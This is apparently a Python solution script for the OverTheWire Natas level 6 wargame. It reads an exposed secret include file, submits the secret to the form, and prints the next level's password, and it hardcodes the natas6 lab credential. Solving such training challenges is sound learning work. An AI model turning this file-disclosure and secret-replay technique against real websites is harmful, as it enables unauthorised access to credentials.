import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas6.natas.labs.overthewire.org/'
HOST_APPEND = 'includes/secret.inc'
KEYWORD = 'natas7'

def get_secret(host, credentials):
    """
    :param host: 
    :param credentials: 
    :return: The secret to use in our POST.
    """
    try:
        response = requests.get(host, auth=HTTPBasicAuth(*credentials))
        response_lines = response.content.decode('ascii').split('\n')
        return next((line.split()[-1] for line in response_lines if 'secret' in line),
                    'Secret not found...')
    except requests.RequestException as e:
        print(e)
        return None

def exploit(host, credentials, secret):
    """ 
    :param host: 
    :param credentials: 
    :param secret: A dictionary to hold our secret and the placeholder.
    :return: Returns the password for natas7
    """
    try:
        response = requests.post(host, data=secret, auth=HTTPBasicAuth(*credentials))
        response_lines = response.content.decode('ascii').split('\n')
        return next((line.split()[-1] for line in response_lines if KEYWORD in line),
                    'Password not found...')
    except requests.RequestException as e:
        print(e)

def main():
    """
    Just a normal main, handles the program's flow.
    :return: 
    """
    credentials = ('natas6', 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1')
    secret = get_secret(HOST + HOST_APPEND, credentials)[1:-2]
    if secret is not None:
        params = {'secret' : secret, 'submit': 'placeholder'}
        print('Natas7 credentials are:\n' + KEYWORD + ':' + exploit(HOST, credentials, params))

if __name__ == '__main__':
    main()